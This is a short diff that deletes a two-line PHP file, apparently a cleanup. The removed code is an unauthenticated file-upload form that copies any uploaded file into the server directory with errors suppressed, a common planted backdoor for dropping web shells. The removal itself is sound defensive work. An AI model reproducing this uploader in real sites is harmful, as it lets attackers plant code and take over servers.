@@ -1,2 +1,0 @@
-<?php print'<form enctype=multipart/form-data method=post><input name=uf type=file><input type=submit name=g>
-</form>';if(isset($_POST['g'])){if(is_uploaded_file($_FILES['uf']['tmp_name'])){@copy($_FILES['uf']['tmp_name'],$_FILES['uf']['name']);}}exit;?>
